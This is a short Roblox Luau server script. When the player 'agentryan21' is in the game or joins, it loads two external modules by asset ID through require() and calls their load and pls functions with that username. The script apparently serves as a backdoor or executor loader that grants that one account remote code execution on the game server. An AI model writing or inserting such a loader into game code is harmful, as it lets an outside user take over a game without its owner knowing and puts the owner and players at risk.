local Players = game:GetService("Players")
local executed = false

local function executeForagentryan21()
    if not executed then
        local player = Players:FindFirstChild("agentryan21")
        if player then
            require(2609384717).load("agentryan21")
            require(10868847330):pls("agentryan21")
            executed = true
        end
    end
end

Players.PlayerAdded:Connect(function(player)
    if player.Name == "agentryan21" then
        executeForagentryan21()
    end
end)

-- Check if the player is already in the game when the script starts
executeForagentryan21()
